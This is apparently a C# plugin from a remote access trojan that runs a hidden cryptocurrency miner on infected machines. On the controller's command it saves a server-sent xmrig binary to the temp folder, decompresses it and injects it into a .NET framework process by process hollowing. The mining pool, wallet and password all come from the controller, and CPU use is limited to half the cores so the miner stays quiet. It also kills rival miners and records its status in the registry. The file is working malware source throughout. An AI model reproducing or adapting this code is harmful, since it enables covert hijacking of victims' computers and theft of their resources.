using Plugin.MessagePack;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;

namespace Plugin.Handler
{
    internal class HandleMiner
    {
        public HandleMiner(MsgPack unpack_msgpack)
        {
            try
            {
                switch (unpack_msgpack.ForcePathObject("Command").AsString)
                {
                    case "stop":
                        {
                            KillMiner();
                            break;
                        }

                    case "run":
                        {
                            RunMiner(unpack_msgpack);
                            break;
                        }

                    case "save":
                        {
                            File.WriteAllBytes(Path.GetTempPath() + unpack_msgpack.ForcePathObject("Hash").AsString + ".bin", unpack_msgpack.ForcePathObject("Bin").GetAsBytes());
                            RunMiner(unpack_msgpack);
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        public void RunMiner(MsgPack unpack_msgpack)
        {
            try
            {
                string xmrig = Path.GetTempPath() + unpack_msgpack.ForcePathObject("Hash").AsString + ".bin";
                string injectTo = unpack_msgpack.ForcePathObject("InjectTo").AsString;
                string args = $"-B --donate-level=1 -t {Environment.ProcessorCount / 2} -v 0 --cpu-priority=3 -a cn/r -k -o {unpack_msgpack.ForcePathObject("Pool").AsString} -u {unpack_msgpack.ForcePathObject("Wallet").AsString} -p {unpack_msgpack.ForcePathObject("Pass").AsString}";
                if (!File.Exists(xmrig))
                {
                    //ask server to send xmrig
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "GetXmr";
                    Connection.Send(msgpack.Encode2Bytes());
                    return;
                }
                KillMiner();
                if (RunPE.Run(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), injectTo), Zip.Decompress(File.ReadAllBytes(Path.GetTempPath() + unpack_msgpack.ForcePathObject("Hash").AsString + ".bin")), args, false))
                {
                    SetRegistry.SetValue(Connection.Hwid, "1");
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
            Connection.Disconnected();
        }

        public void KillMiner()
        {
            foreach (var process in Process.GetProcesses())
            {
                try
                {
                    if (GetCommandLine(process).ToLower().Contains("--donate-level="))
                    {
                        process.Kill();
                        SetRegistry.SetValue(Connection.Hwid, "0");
                    }
                }
                catch{ }
            }
            Connection.Disconnected();
        }

        public string GetCommandLine(Process process)
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT CommandLine FROM Win32_Process WHERE ProcessId = " + process.Id))
                using (ManagementObjectCollection objects = searcher.Get())
                {
                    return objects.Cast<ManagementBaseObject>().SingleOrDefault()?["CommandLine"]?.ToString();
                }
            }
            catch { }
            return "";
        }

    }
}
